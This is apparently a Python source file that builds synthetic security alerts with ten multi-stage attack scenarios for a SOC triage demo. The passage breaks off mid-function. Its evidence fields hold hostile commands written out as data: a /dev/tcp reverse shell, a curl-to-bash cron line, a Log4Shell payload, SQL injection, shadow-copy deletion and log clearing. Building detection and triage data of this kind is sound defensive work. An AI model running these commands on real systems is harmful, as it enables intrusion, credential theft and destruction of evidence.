# backend/ingestion.py - Synthetic Security Alert Generator for Problem Statement #25
"""
Synthetic Security Alert Generator for Microsoft Problem Statement #25 ("3,000 Alerts, One Analyst").

Demonstrates the complete Tier-1 SOC alert triage workflow:
3,000 alerts -> related alerts -> incident grouping -> risk prioritization -> asset criticality
-> MITRE ATT&CK -> AI shift-handover brief -> human analyst review -> MTTT measurement.

Key Architecture Principles:
- Single generator implementation for both production ingestion and ML dataset extraction.
- Fully parameterized by alert count (default 3,000) and random seed (default 42).
- Complete 19-field realistic SOC telemetry schema.
- 10 multi-stage attack scenarios with realistic temporal progression and legitimate evidence.
- High-volume, realistic benign noise / false-positive telemetry intermixed throughout 24 hours.
- Strict evaluation safety: ground_truth_incident_id, scenario_id, and is_false_positive are provided
  strictly for evaluation and MUST NEVER be used by the production correlation engine.
"""

import random
from datetime import datetime, timedelta, timezone
from typing import List, Dict, Any, Optional
from models import RawAlert

# Asset Inventory Definition with Realistic Enterprise Criticalities
ENTERPRISE_ASSETS = [
    # Critical Tier: Core Identity, Domain Controllers, Production Data
    {"id": "AST-DC-01", "name": "DC-PROD-01", "criticality": "Critical", "ip": "10.0.1.10", "type": "Domain Controller"},
    {"id": "AST-CORP-DC-02", "name": "CORP-DC-02", "criticality": "Critical", "ip": "10.0.1.11", "type": "Backup Domain Controller"},
    {"id": "AST-IDP-OKTA-01", "name": "IDP-OKTA-GATEWAY", "criticality": "Critical", "ip": "10.0.1.20", "type": "Identity Provider"},
    {"id": "AST-DB-SQL-01", "name": "PROD-DB-SQL-01", "criticality": "Critical", "ip": "10.0.2.15", "type": "Primary SQL Cluster"},
    {"id": "AST-CORP-SP-01", "name": "CORP-SHAREPOINT", "criticality": "Critical", "ip": "13.107.6.152", "type": "Enterprise Document Vault"},
    {"id": "AST-CORP-EXCH-01", "name": "CORP-EXCHANGE-ONLINE", "criticality": "Critical", "ip": "40.97.0.0", "type": "Corporate Mail Tenant"},

    # High Tier: Web Gateways, Build Systems, Finance Servers, Executive Endpoints
    {"id": "AST-DMZ-WEB-02", "name": "DMZ-WEB-SRV-02", "criticality": "High", "ip": "10.0.10.2", "type": "DMZ Web Application"},
    {"id": "AST-BUILD-RUNNER-04", "name": "BUILD-RUNNER-04", "criticality": "High", "ip": "10.0.20.14", "type": "CI/CD Pipeline Runner"},
    {"id": "AST-FIN-FILE-01", "name": "FIN-FILE-SRV-01", "criticality": "High", "ip": "10.0.4.50", "type": "Finance Department File Server"},
    {"id": "AST-WKSTN-FIN-042", "name": "WKSTN-FIN-042", "criticality": "High", "ip": "10.0.4.42", "type": "Senior Finance Workstation"},
    {"id": "AST-WKSTN-FIN-019", "name": "WKSTN-FIN-019", "criticality": "High", "ip": "10.0.4.19", "type": "Payroll Controller Laptop"},
    {"id": "AST-EXEC-SURFACE-9", "name": "EXEC-SURFACE-9", "criticality": "High", "ip": "10.0.3.109", "type": "CFO Surface Laptop"},
    {"id": "AST-GATEWAY-PERIMETER", "name": "GATEWAY-PERIMETER", "criticality": "High", "ip": "10.0.0.1", "type": "Perimeter NextGen Firewall"},

    # Medium Tier: Departmental Workstations, Regional Storage
    {"id": "AST-WKSTN-HR-012", "name": "WKSTN-HR-012", "criticality": "Medium", "ip": "10.0.5.12", "type": "Human Resources Workstation"},
    {"id": "AST-BACKUP-STORAGE", "name": "BACKUP-STORAGE-VAULT", "criticality": "Medium", "ip": "10.0.8.22", "type": "Secondary Backup Target"},
    {"id": "AST-APP-API-03", "name": "INTERNAL-API-SRV-03", "criticality": "Medium", "ip": "10.0.10.33", "type": "Internal Microservice Node"},

    # Low Tier: Staging Bastions, Test Nodes, Sandbox Enclaves
    {"id": "AST-STAGING-TEST-01", "name": "STAGING-TEST-BASTION", "criticality": "Low", "ip": "10.0.99.5", "type": "Dev/QA Linux Bastion"},
    {"id": "AST-DEV-STAGING-04", "name": "DEV-STAGING-04", "criticality": "Low", "ip": "10.0.99.14", "type": "Staging Web Instance"},
    {"id": "AST-SCANNER-NODE-01", "name": "SCANNER-NODE-01", "criticality": "Low", "ip": "10.0.100.2", "type": "Vulnerability Scanner Appliance"},
    {"id": "AST-SSPR-PORTAL", "name": "SSPR-PORTAL", "criticality": "Low", "ip": "10.0.100.8", "type": "Self-Service Password Portal"}
]


def _build_attack_scenarios(base_time: datetime, rng: random.Random) -> List[Dict[str, Any]]:
    """Defines 10 realistic multi-stage SOC attack scenarios with temporal sequences."""
    scenarios = [
        # Scenario 1: Ransomware & Shadow Copy Deletion (Critical DC target)
        {
            "scenario_id": "SCN-001",
            "ground_truth_incident_id": "GT-INC-001",
            "title": "Ransomware Kill-Chain & Shadow Copy Deletion on DC-PROD-01",
            "start_offset_min": 15,
            "stages": [
                {
                    "source": "Email Gateway",
                    "alert_type": "Spearphishing Macro Attachment Detected",
                    "severity": "High",
                    "asset_id": "AST-WKSTN-FIN-042",
                    "asset_name": "WKSTN-FIN-042",
                    "asset_criticality": "High",
                    "user": "sarah.chen@contoso.com",
                    "source_ip": "198.51.100.23",
                    "destination_ip": "10.0.4.42",
                    "protocol": "SMTP",
                    "indicator": "invoice_sept2026.docm",
                    "description": "Weaponized Word document with AutoOpen macro received from external address",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "T1566.001",
                    "evidence": {"attachment": "invoice_sept2026.docm", "macro_hash": "a4b825dc9f3b11874c7e", "sender": "billing@extern-vendors.com"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Encoded PowerShell Download",
                    "severity": "High",
                    "asset_id": "AST-WKSTN-FIN-042",
                    "asset_name": "WKSTN-FIN-042",
                    "asset_criticality": "High",
                    "user": "sarah.chen@contoso.com",
                    "source_ip": "10.0.4.42",
                    "destination_ip": "198.51.100.23",
                    "protocol": "HTTPS",
                    "indicator": "198.51.100.23:8080",
                    "description": "PowerShell spawned from winword.exe with -EncodedCommand retrieving stage-2 payload",
                    "mitre_tactic": "Execution",
                    "mitre_technique": "T1059.001",
                    "evidence": {"command_line": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...", "download_url": "http://198.51.100.23:8080/payload.bin"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "LSASS Memory Dump",
                    "severity": "Critical",
                    "asset_id": "AST-WKSTN-FIN-042",
                    "asset_name": "WKSTN-FIN-042",
                    "asset_criticality": "High",
                    "user": "sarah.chen@contoso.com",
                    "source_ip": "10.0.4.42",
                    "destination_ip": "10.0.4.42",
                    "protocol": "LOCAL",
                    "indicator": "lsass.exe",
                    "description": "Procdump invoked with PROCESS_ALL_ACCESS against lsass.exe to extract administrative tickets",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "T1003.001",
                    "evidence": {"target_process": "lsass.exe", "caller": "procdump64.exe", "access_mask": "0x1FFFFF"}
                },
                {
                    "source": "Identity Provider",
                    "alert_type": "Pass-the-Hash Privilege Escalation",
                    "severity": "Critical",
                    "asset_id": "AST-DC-01",
                    "asset_name": "DC-PROD-01",
                    "asset_criticality": "Critical",
                    "user": "svc-backup-admin",
                    "source_ip": "10.0.4.42",
                    "destination_ip": "10.0.1.10",
                    "protocol": "SMB",
                    "indicator": "10.0.1.10",
                    "description": "Compromised Domain Admin backup account credentials reused to authenticate directly to DC-PROD-01",
                    "mitre_tactic": "Privilege Escalation",
                    "mitre_technique": "T1078.002",
                    "evidence": {"auth_package": "NTLM", "logon_type": 3, "service_ticket": "krbtgt/contoso.com"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Volume Shadow Copies Deletion",
                    "severity": "Critical",
                    "asset_id": "AST-DC-01",
                    "asset_name": "DC-PROD-01",
                    "asset_criticality": "Critical",
                    "user": "svc-backup-admin",
                    "source_ip": "10.0.4.42",
                    "destination_ip": "10.0.1.10",
                    "protocol": "LOCAL",
                    "indicator": "vssadmin.exe",
                    "description": "vssadmin.exe executed to purge system restore points prior to ransomware encryption",
                    "mitre_tactic": "Impact",
                    "mitre_technique": "T1490",
                    "evidence": {"command_line": "vssadmin.exe delete shadows /all /quiet", "parent_proc": "psexesvc.exe"}
                }
            ]
        },
        # Scenario 2: Executive Account Compromise & Cloud Exfiltration (Critical Asset)
        {
            "scenario_id": "SCN-002",
            "ground_truth_incident_id": "GT-INC-002",
            "title": "Executive Account Compromise & Cloud Data Exfiltration",
            "start_offset_min": 60,
            "stages": [
                {
                    "source": "Identity Provider",
                    "alert_type": "Impossible Travel Sign-In",
                    "severity": "High",
                    "asset_id": "AST-EXEC-SURFACE-9",
                    "asset_name": "EXEC-SURFACE-9",
                    "asset_criticality": "High",
                    "user": "marcus.vance.cfo@contoso.com",
                    "source_ip": "185.220.101.5",
                    "destination_ip": "13.107.6.152",
                    "protocol": "HTTPS",
                    "indicator": "185.220.101.5",
                    "description": "Sign-in from known Tor exit node 18 minutes after physical authentication in Seattle headquarters",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "T1078.004",
                    "evidence": {"asn": "AS60729 TorExit", "prev_city": "Seattle", "curr_city": "Frankfurt"}
                },
                {
                    "source": "Cloud Audit",
                    "alert_type": "Suspicious Mailbox Forwarding Rule",
                    "severity": "High",
                    "asset_id": "AST-CORP-EXCH-01",
                    "asset_name": "CORP-EXCHANGE-ONLINE",
                    "asset_criticality": "Critical",
                    "user": "marcus.vance.cfo@contoso.com",
                    "source_ip": "185.220.101.5",
                    "destination_ip": "40.97.0.0",
                    "protocol": "HTTPS",
                    "indicator": "finance-drop@proton.me",
                    "description": "Automated transport rule created forwarding confidential financial attachments to external recipient",
                    "mitre_tactic": "Collection",
                    "mitre_technique": "T1114.002",
                    "evidence": {"forward_to": "finance-drop@proton.me", "rule_name": "AutoArchiveSystem"}
                },
                {
                    "source": "Cloud Audit",
                    "alert_type": "Mass Download of Confidential Documents",
                    "severity": "Critical",
                    "asset_id": "AST-CORP-SP-01",
                    "asset_name": "CORP-SHAREPOINT",
                    "asset_criticality": "Critical",
                    "user": "marcus.vance.cfo@contoso.com",
                    "source_ip": "185.220.101.5",
                    "destination_ip": "13.107.6.152",
                    "protocol": "HTTPS",
                    "indicator": "CORP-SHAREPOINT/Finance",
                    "description": "Over 280 restricted spreadsheets downloaded within 10 minutes from executive workspace",
                    "mitre_tactic": "Collection",
                    "mitre_technique": "T1213",
                    "evidence": {"file_count": 284, "classification": "Highly Confidential Financial"}
                },
                {
                    "source": "Network Firewall",
                    "alert_type": "High-Volume Data Exfiltration",
                    "severity": "Critical",
                    "asset_id": "AST-GATEWAY-PERIMETER",
                    "asset_name": "GATEWAY-PERIMETER",
                    "asset_criticality": "High",
                    "user": "marcus.vance.cfo@contoso.com",
                    "source_ip": "185.220.101.5",
                    "destination_ip": "104.18.2.19",
                    "protocol": "HTTPS",
                    "indicator": "mega.nz",
                    "description": "4.8 GB outbound encrypted traffic transmitted to unauthorized cloud storage mega.nz",
                    "mitre_tactic": "Exfiltration",
                    "mitre_technique": "T1567.002",
                    "evidence": {"bytes_sent": 5153960755, "destination_domain": "mega.nz", "protocol": "HTTPS"}
                }
            ]
        },
        # Scenario 3: DMZ Web App Log4j Injection & Reverse Shell (High Asset)
        {
            "scenario_id": "SCN-003",
            "ground_truth_incident_id": "GT-INC-003",
            "title": "DMZ Web App Log4j Injection & Reverse Shell",
            "start_offset_min": 140,
            "stages": [
                {
                    "source": "Network Firewall",
                    "alert_type": "JNDI / LDAP Injection Exploit Attempt",
                    "severity": "High",
                    "asset_id": "AST-DMZ-WEB-02",
                    "asset_name": "DMZ-WEB-SRV-02",
                    "asset_criticality": "High",
                    "user": "www-data",
                    "source_ip": "203.0.113.88",
                    "destination_ip": "10.0.10.2",
                    "protocol": "HTTPS",
                    "indicator": "${jndi:ldap://203.0.113.88:1389/Exploit}",
                    "description": "Inbound HTTP POST containing Log4Shell exploit payload in User-Agent header",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "T1190",
                    "evidence": {"payload": "${jndi:ldap://203.0.113.88:1389/Exploit}", "port": 443}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Suspicious Child Process Spawned by Java",
                    "severity": "Critical",
                    "asset_id": "AST-DMZ-WEB-02",
                    "asset_name": "DMZ-WEB-SRV-02",
                    "asset_criticality": "High",
                    "user": "www-data",
                    "source_ip": "10.0.10.2",
                    "destination_ip": "203.0.113.88",
                    "protocol": "TCP",
                    "indicator": "/bin/sh reverse shell",
                    "description": "java.exe spawned /bin/sh establishing interactive outbound TCP session on port 4444",
                    "mitre_tactic": "Execution",
                    "mitre_technique": "T1059.004",
                    "evidence": {"command_line": "/bin/sh -i >& /dev/tcp/203.0.113.88/4444 0>&1", "pid": 4182}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Unauthorized Cron Job Scheduled",
                    "severity": "High",
                    "asset_id": "AST-DMZ-WEB-02",
                    "asset_name": "DMZ-WEB-SRV-02",
                    "asset_criticality": "High",
                    "user": "www-data",
                    "source_ip": "10.0.10.2",
                    "destination_ip": "203.0.113.88",
                    "protocol": "LOCAL",
                    "indicator": "/etc/cron.d/sync_worker",
                    "description": "Persistence achieved via cron entry downloading recurring bash payload from C2",
                    "mitre_tactic": "Persistence",
                    "mitre_technique": "T1053.003",
                    "evidence": {"cron_entry": "*/10 * * * * curl -s http://203.0.113.88/b.sh | bash"}
                }
            ]
        },
        # Scenario 4: SQL Database Injection & Bulk Dump (Critical Asset)
        {
            "scenario_id": "SCN-004",
            "ground_truth_incident_id": "GT-INC-004",
            "title": "SQL Injection & Database Dumping on PROD-DB-SQL-01",
            "start_offset_min": 220,
            "stages": [
                {
                    "source": "Network Firewall",
                    "alert_type": "SQL Injection Attack Detected",
                    "severity": "High",
                    "asset_id": "AST-DB-SQL-01",
                    "asset_name": "PROD-DB-SQL-01",
                    "asset_criticality": "Critical",
                    "user": "db_service_acct",
                    "source_ip": "198.51.100.77",
                    "destination_ip": "10.0.2.15",
                    "protocol": "HTTPS",
                    "indicator": "' UNION SELECT username, password_hash FROM sys_users--",
                    "description": "Automated SQL injection sequence targeting customer portal authentication endpoint",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "T1190",
                    "evidence": {"query": "' UNION SELECT username, password_hash FROM sys_users--", "http_status": 200}
                },
                {
                    "source": "Cloud Audit",
                    "alert_type": "Database Privilege Escalation via xp_cmdshell",
                    "severity": "Critical",
                    "asset_id": "AST-DB-SQL-01",
                    "asset_name": "PROD-DB-SQL-01",
                    "asset_criticality": "Critical",
                    "user": "db_service_acct",
                    "source_ip": "10.0.2.15",
                    "destination_ip": "10.0.2.15",
                    "protocol": "TDS",
                    "indicator": "xp_cmdshell",
                    "description": "SQL Server extended stored procedure xp_cmdshell enabled by non-admin application role",
                    "mitre_tactic": "Privilege Escalation",
                    "mitre_technique": "T1078",
                    "evidence": {"command": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Mass Table Dump to Unencrypted Staging File",
                    "severity": "Critical",
                    "asset_id": "AST-DB-SQL-01",
                    "asset_name": "PROD-DB-SQL-01",
                    "asset_criticality": "Critical",
                    "user": "db_service_acct",
                    "source_ip": "10.0.2.15",
                    "destination_ip": "198.51.100.77",
                    "protocol": "SMB",
                    "indicator": "C:\\ProgramData\\dump_users.csv",
                    "description": "bcp utility used to dump 450,000 customer records to disk staging path",
                    "mitre_tactic": "Collection",
                    "mitre_technique": "T1005",
                    "evidence": {"record_count": 450000, "target_file": "C:\\ProgramData\\dump_users.csv"}
                }
            ]
        },
        # Scenario 5: HR Dropper & Scheduled Task Persistence (Medium Asset)
        {
            "scenario_id": "SCN-005",
            "ground_truth_incident_id": "GT-INC-005",
            "title": "Phishing Dropper & Scheduled Task Persistence on WKSTN-HR-012",
            "start_offset_min": 310,
            "stages": [
                {
                    "source": "Email Gateway",
                    "alert_type": "Phishing Link Clicked with Archive Download",
                    "severity": "Medium",
                    "asset_id": "AST-WKSTN-HR-012",
                    "asset_name": "WKSTN-HR-012",
                    "asset_criticality": "Medium",
                    "user": "lisa.miller@contoso.com",
                    "source_ip": "192.0.2.89",
                    "destination_ip": "10.0.5.12",
                    "protocol": "HTTPS",
                    "indicator": "resume_portfolio.zip",
                    "description": "User clicked inbound link downloading password-protected zip file bypassing gateway filter",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "T1566.002",
                    "evidence": {"url": "https://careers-portal-external.com/resume.zip", "client_ip": "10.0.5.12"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "WScript Execution of Dropped Script",
                    "severity": "High",
                    "asset_id": "AST-WKSTN-HR-012",
                    "asset_name": "WKSTN-HR-012",
                    "asset_criticality": "Medium",
                    "user": "lisa.miller@contoso.com",
                    "source_ip": "10.0.5.12",
                    "destination_ip": "10.0.5.12",
                    "protocol": "LOCAL",
                    "indicator": "wscript.exe",
                    "description": "wscript.exe executed obfuscated VBScript from user AppData temporary directory",
                    "mitre_tactic": "Execution",
                    "mitre_technique": "T1059.005",
                    "evidence": {"process": "wscript.exe", "file": "C:\\Users\\lisa.miller\\AppData\\Local\\Temp\\update.vbs"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Scheduled Task Created for Persistence",
                    "severity": "Medium",
                    "asset_id": "AST-WKSTN-HR-012",
                    "asset_name": "WKSTN-HR-012",
                    "asset_criticality": "Medium",
                    "user": "lisa.miller@contoso.com",
                    "source_ip": "10.0.5.12",
                    "destination_ip": "10.0.5.12",
                    "protocol": "LOCAL",
                    "indicator": "schtasks.exe /create /tn SecurityHealthCheck",
                    "description": "schtasks.exe invoked to establish persistent execution on user logon",
                    "mitre_tactic": "Persistence",
                    "mitre_technique": "T1053.005",
                    "evidence": {"task_name": "SecurityHealthCheck", "command": "wscript.exe C:\\ProgramData\\svc.vbs"}
                }
            ]
        },
        # Scenario 6: External SSH Brute Force (Low Asset)
        {
            "scenario_id": "SCN-006",
            "ground_truth_incident_id": "GT-INC-006",
            "title": "External SSH Brute Force against STAGING-TEST-BASTION",
            "start_offset_min": 400,
            "stages": [
                {
                    "source": "Network Firewall",
                    "alert_type": "SSH Password Guessing Attempt",
                    "severity": "Medium",
                    "asset_id": "AST-STAGING-TEST-01",
                    "asset_name": "STAGING-TEST-BASTION",
                    "asset_criticality": "Low",
                    "user": "root",
                    "source_ip": "192.0.2.115",
                    "destination_ip": "10.0.99.5",
                    "protocol": "SSH",
                    "indicator": "192.0.2.115",
                    "description": "Repeated automated SSH authentication failures against staging bastion gateway",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "T1110.001",
                    "evidence": {"port": 22, "attempts_per_sec": 14, "auth_target": "root"}
                },
                {
                    "source": "Network Firewall",
                    "alert_type": "Network Service Port Scan",
                    "severity": "Low",
                    "asset_id": "AST-STAGING-TEST-01",
                    "asset_name": "STAGING-TEST-BASTION",
                    "asset_criticality": "Low",
                    "user": "root",
                    "source_ip": "192.0.2.115",
                    "destination_ip": "10.0.99.5",
                    "protocol": "TCP",
                    "indicator": "SYN_SCAN",
                    "description": "Port scanning activity probing ports 21, 22, 80, 443, 3306, 8080 on staging node",
                    "mitre_tactic": "Discovery",
                    "mitre_technique": "T1046",
                    "evidence": {"ports_probed": [21, 22, 80, 443, 3306, 8080], "flags": "SYN"}
                }
            ]
        },
        # Scenario 7: MFA Fatigue Push Bombing & Session Hijack (Critical IDP Asset)
        {
            "scenario_id": "SCN-007",
            "ground_truth_incident_id": "GT-INC-007",
            "title": "MFA Fatigue Push Bombing & Session Hijack on IDP-OKTA-GATEWAY",
            "start_offset_min": 490,
            "stages": [
                {
                    "source": "Identity Provider",
                    "alert_type": "Multi-Factor Authentication Request Spamming",
                    "severity": "High",
                    "asset_id": "AST-IDP-OKTA-01",
                    "asset_name": "IDP-OKTA-GATEWAY",
                    "asset_criticality": "Critical",
                    "user": "david.kim.it@contoso.com",
                    "source_ip": "45.33.32.156",
                    "destination_ip": "10.0.1.20",
                    "protocol": "HTTPS",
                    "indicator": "45.33.32.156",
                    "description": "Over 35 MFA push notifications triggered in 4 minutes targeting IT Administrator mobile device",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "T1621",
                    "evidence": {"push_count": 38, "duration_sec": 240, "app": "Okta Verify"}
                },
                {
                    "source": "Identity Provider",
                    "alert_type": "Suspicious IdP Admin Role Delegation",
                    "severity": "Critical",
                    "asset_id": "AST-IDP-OKTA-01",
                    "asset_name": "IDP-OKTA-GATEWAY",
                    "asset_criticality": "Critical",
                    "user": "david.kim.it@contoso.com",
                    "source_ip": "45.33.32.156",
                    "destination_ip": "10.0.1.20",
                    "protocol": "HTTPS",
                    "indicator": "SuperAdmin Delegation",
                    "description": "Target profile authorized login and immediately provisioned secondary SuperAdmin privileges",
                    "mitre_tactic": "Persistence",
                    "mitre_technique": "T1098",
                    "evidence": {"granted_role": "SuperAdministrator", "granted_to": "david.kim.it@contoso.com"}
                },
                {
                    "source": "Cloud Audit",
                    "alert_type": "Unapproved Hardware Security Key Registered",
                    "severity": "High",
                    "asset_id": "AST-IDP-OKTA-01",
                    "asset_name": "IDP-OKTA-GATEWAY",
                    "asset_criticality": "Critical",
                    "user": "david.kim.it@contoso.com",
                    "source_ip": "45.33.32.156",
                    "destination_ip": "10.0.1.20",
                    "protocol": "HTTPS",
                    "indicator": "FIDO2 Key Enrollment",
                    "description": "Attacker registered a new non-corporate hardware token for permanent persistence",
                    "mitre_tactic": "Persistence",
                    "mitre_technique": "T1098.005",
                    "evidence": {"device_type": "FIDO2", "device_model": "YubiKey 5 Series (Unknown serial)"}
                }
            ]
        },
        # Scenario 8: Lateral SMB Movement & PsExec (High Asset)
        {
            "scenario_id": "SCN-008",
            "ground_truth_incident_id": "GT-INC-008",
            "title": "Lateral SMB Movement & PsExec on FIN-FILE-SRV-01",
            "start_offset_min": 580,
            "stages": [
                {
                    "source": "Network Firewall",
                    "alert_type": "Anomalous Administrative Share Access",
                    "severity": "High",
                    "asset_id": "AST-FIN-FILE-01",
                    "asset_name": "FIN-FILE-SRV-01",
                    "asset_criticality": "High",
                    "user": "alex.patel@contoso.com",
                    "source_ip": "10.0.4.19",
                    "destination_ip": "10.0.4.50",
                    "protocol": "SMB",
                    "indicator": "\\\\FIN-FILE-SRV-01\\ADMIN$",
                    "description": "Workstation WKSTN-FIN-019 connected to ADMIN$ network share on finance file repository",
                    "mitre_tactic": "Lateral Movement",
                    "mitre_technique": "T1021.002",
                    "evidence": {"share_path": "\\\\FIN-FILE-SRV-01\\ADMIN$", "smb_version": "SMBv3"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Remote Service Creation via PsExec",
                    "severity": "High",
                    "asset_id": "AST-FIN-FILE-01",
                    "asset_name": "FIN-FILE-SRV-01",
                    "asset_criticality": "High",
                    "user": "alex.patel@contoso.com",
                    "source_ip": "10.0.4.19",
                    "destination_ip": "10.0.4.50",
                    "protocol": "SMB",
                    "indicator": "PSEXESVC.exe",
                    "description": "PsExec service binary instantiated and started on file server from remote workstation",
                    "mitre_tactic": "Execution",
                    "mitre_technique": "T1569.002",
                    "evidence": {"service_name": "PSEXESVC", "bin_path": "%SystemRoot%\\PSEXESVC.exe"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Encrypted Archive Creation in System Directory",
                    "severity": "Medium",
                    "asset_id": "AST-FIN-FILE-01",
                    "asset_name": "FIN-FILE-SRV-01",
                    "asset_criticality": "High",
                    "user": "alex.patel@contoso.com",
                    "source_ip": "10.0.4.50",
                    "destination_ip": "10.0.4.50",
                    "protocol": "LOCAL",
                    "indicator": "7z.exe a -p C:\\ProgramData\\fin_dump.7z",
                    "description": "7-Zip command-line tool executed to compress payroll folders with password encryption",
                    "mitre_tactic": "Collection",
                    "mitre_technique": "T1560.001",
                    "evidence": {"archive_path": "C:\\ProgramData\\fin_dump.7z", "tool": "7z.exe"}
                }
            ]
        },
        # Scenario 9: CI/CD Supply Chain Pipeline Runner Poisoning (High Asset)
        {
            "scenario_id": "SCN-009",
            "ground_truth_incident_id": "GT-INC-009",
            "title": "CI/CD Supply Chain Pipeline Poisoning on BUILD-RUNNER-04",
            "start_offset_min": 680,
            "stages": [
                {
                    "source": "Cloud Audit",
                    "alert_type": "Compromised Package Dependency Injection",
                    "severity": "High",
                    "asset_id": "AST-BUILD-RUNNER-04",
                    "asset_name": "BUILD-RUNNER-04",
                    "asset_criticality": "High",
                    "user": "gitlab-runner-svc",
                    "source_ip": "91.108.240.10",
                    "destination_ip": "10.0.20.14",
                    "protocol": "HTTPS",
                    "indicator": "npm: colors-extended-v2.1",
                    "description": "Build job pulled typosquatted package containing malicious post-install lifecycle script",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "T1195.002",
                    "evidence": {"package": "colors-extended-v2.1", "registry": "registry.npmjs.org"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Environment Variable Secrets Harvesting",
                    "severity": "Critical",
                    "asset_id": "AST-BUILD-RUNNER-04",
                    "asset_name": "BUILD-RUNNER-04",
                    "asset_criticality": "High",
                    "user": "gitlab-runner-svc",
                    "source_ip": "10.0.20.14",
                    "destination_ip": "91.108.240.10",
                    "protocol": "HTTPS",
                    "indicator": "env | grep -E 'AWS|AZURE|API_KEY'",
                    "description": "Child node.js process dumped runner environment variables containing production deployment tokens",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "T1552.001",
                    "evidence": {"target_keys": ["AWS_SECRET_ACCESS_KEY", "ARM_CLIENT_SECRET"]}
                },
                {
                    "source": "Network Firewall",
                    "alert_type": "Suspicious C2 Egress from Build Cluster",
                    "severity": "High",
                    "asset_id": "AST-BUILD-RUNNER-04",
                    "asset_name": "BUILD-RUNNER-04",
                    "asset_criticality": "High",
                    "user": "gitlab-runner-svc",
                    "source_ip": "10.0.20.14",
                    "destination_ip": "91.108.240.10",
                    "protocol": "HTTPS",
                    "indicator": "91.108.240.10",
                    "description": "Outbound connection from CI runner to unauthorized external IP hosting drop endpoint",
                    "mitre_tactic": "Command and Control",
                    "mitre_technique": "T1071.001",
                    "evidence": {"dest_ip": "91.108.240.10", "port": 443, "bytes_out": 42100}
                }
            ]
        },
        # Scenario 10: Active Directory DCSync Kerberos Compromise (Critical DC Asset)
        {
            "scenario_id": "SCN-010",
            "ground_truth_incident_id": "GT-INC-010",
            "title": "Active Directory DCSync Kerberos Compromise on CORP-DC-02",
            "start_offset_min": 780,
            "stages": [
                {
                    "source": "Identity Provider",
                    "alert_type": "Directory Replication Service DCSync Request",
                    "severity": "Critical",
                    "asset_id": "AST-CORP-DC-02",
                    "asset_name": "CORP-DC-02",
                    "asset_criticality": "Critical",
                    "user": "svc-dirsync",
                    "source_ip": "10.0.1.15",
                    "destination_ip": "10.0.1.11",
                    "protocol": "RPC",
                    "indicator": "DSGetNCChanges",
                    "description": "DCSync attack executed requesting complete password hash replication for contoso.com",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "T1003.006",
                    "evidence": {"op": "DsGetNCChanges", "target_domain": "contoso.com", "naming_context": "schema"}
                },
                {
                    "source": "Endpoint EDR",
                    "alert_type": "Security Event Log Cleared",
                    "severity": "High",
                    "asset_id": "AST-CORP-DC-02",
                    "asset_name": "CORP-DC-02",
                    "asset_criticality": "Critical",
                    "user": "svc-dirsync",
                    "source_ip": "10.0.1.11",
                    "destination_ip": "10.0.1.11",
                    "protocol": "LOCAL",
                    "indicator": "wevtutil cl Security",
                    "description": "Windows Security event log was cleared using wevtutil command line to hinder investigation",
                    "mitre_tactic": "Defense Evasion",
                    "mitre_technique": "T1070.001",
                    "evidence": {"command": "wevtutil.exe cl Security", "event_id": 1102}
                },
                {
                    "source": "Identity Provider",
                    "alert_type": "Golden Ticket (Kerberos TGT) Forged",
                    "severity": "Critical",
                    "asset_id": "AST-CORP-DC-02",
                    "asset_name": "CORP-DC-02",
                    "asset_criticality": "Critical",
                    "user": "svc-dirsync",
                    "source_ip": "10.0.1.15",
                    "destination_ip": "10.0.1.11",
                    "protocol": "Kerberos",
                    "indicator": "krbtgt ticket lifetime 10 years",
                    "description": "Forged Kerberos Ticket-Granting Ticket presented with non-standard expiration lifetime",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "T1558.001",
                    "evidence": {"ticket_flags": "0x40e10000", "lifetime_hours": 87600}
                }
            ]
        }
    ]
    return scenarios


def _build_scaled_attack_scenarios(base_time: datetime, rng: random.Random, total_scenarios: int = 10) -> List[Dict[str, Any]]:
    """
    Builds attack scenarios, scaling up realistically for stress-test volumes (e.g. 10k, 25k)
    while remaining 100% bit-for-bit identical to the 10 base scenarios for count <= 3000.
    """
    base_scenarios = _build_attack_scenarios(base_time, rng)
    if total_scenarios <= len(base_scenarios):
        return base_scenarios[:total_scenarios]

    scenarios = list(base_scenarios)
    for extra_i in range(len(base_scenarios), total_scenarios):
        tmpl = base_scenarios[extra_i % len(base_scenarios)]
        campaign_num = (extra_i // len(base_scenarios)) + 1
        start_offset = int(((extra_i - 10) / (total_scenarios - 10)) * 1200) + rng.randint(5, 30)

        inst_host_num = (extra_i * 7) % 350 + 1
        client_host = f"CORP-CLIENT-{inst_host_num:03d}"
        client_asset_id = f"AST-CLIENT-{inst_host_num:03d}"
        client_user = f"employee.{inst_host_num:03d}@contoso.com"
        ext_ip = f"198.51.100.{(extra_i * 13) % 200 + 20}"

        new_stages = []
        for st in tmpl["stages"]:
            new_st = dict(st)
            new_st["evidence"] = dict(st.get("evidence", {}))

            if "WKSTN-" in st["asset_name"] or "EXEC-" in st["asset_name"]:
                new_st["asset_id"] = client_asset_id
                new_st["asset_name"] = client_host
                new_st["user"] = client_user

            if st["source_ip"].startswith("198.51.") or st["source_ip"].startswith("203.0."):
                new_st["source_ip"] = ext_ip

            new_stages.append(new_st)

        scenarios.append({
